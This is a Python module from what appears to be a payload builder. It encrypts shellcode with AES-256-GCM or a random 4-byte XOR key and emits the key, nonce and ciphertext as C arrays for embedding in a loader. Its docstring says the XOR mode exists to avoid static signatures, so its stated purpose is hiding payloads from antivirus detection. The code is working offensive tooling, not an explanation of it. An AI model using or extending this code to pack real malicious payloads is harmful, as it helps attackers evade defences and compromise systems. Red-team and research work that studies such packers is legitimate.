"""Builder encryptor — AES-256-GCM and XOR for shellcode/payload wrapping."""
from __future__ import annotations

import os
import struct


def encrypt_aes_gcm(plaintext: bytes) -> tuple[bytes, bytes, bytes]:
    """
    Encrypt plaintext with AES-256-GCM.
    Returns (key, nonce, ciphertext_with_tag).
    Uses Python stdlib only (via cryptography package if available, else raises).
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError as e:
        raise RuntimeError(
            "AES-256-GCM requires 'cryptography': pip install cryptography"
        ) from e

    key   = os.urandom(32)   # 256-bit key
    nonce = os.urandom(12)   # 96-bit nonce (GCM standard)
    ct    = AESGCM(key).encrypt(nonce, plaintext, b"")
    return key, nonce, ct


def encrypt_xor(plaintext: bytes, key: bytes | None = None) -> tuple[bytes, bytes]:
    """
    XOR-encode plaintext with a random 4-byte repeating key.
    Returns (key, ciphertext).  Trivially reversible but avoids static sigs.
    """
    if key is None:
        key = os.urandom(4)
    ct = bytes(b ^ key[i % len(key)] for i, b in enumerate(plaintext))
    return key, ct


def wrap_aes_gcm_c_array(key: bytes, nonce: bytes, ct: bytes) -> str:
    """Render key/nonce/ciphertext as C uint8_t arrays for embedding in the loader."""
    def arr(name: str, data: bytes) -> str:
        hex_vals = ", ".join(f"0x{b:02x}" for b in data)
        return f"static const uint8_t {name}[] = {{{hex_vals}}};"

    lines = [
        arr("ENC_KEY",   key),
        arr("ENC_NONCE", nonce),
        arr("ENC_CT",    ct),
        f"static const size_t ENC_CT_LEN = {len(ct)};",
        f"static const size_t ENC_PT_LEN = {len(ct) - 16};",  # GCM tag is 16 bytes
    ]
    return "\n".join(lines)


def wrap_xor_c_array(key: bytes, ct: bytes) -> str:
    """Render XOR key/ciphertext as C uint8_t arrays."""
    def arr(name: str, data: bytes) -> str:
        hex_vals = ", ".join(f"0x{b:02x}" for b in data)
        return f"static const uint8_t {name}[] = {{{hex_vals}}};"

    return "\n".join([
        arr("XOR_KEY", key),
        arr("XOR_CT",  ct),
        f"static const size_t XOR_CT_LEN = {len(ct)};",
        f"static const uint8_t XOR_KEY_LEN = {len(key)};",
    ])
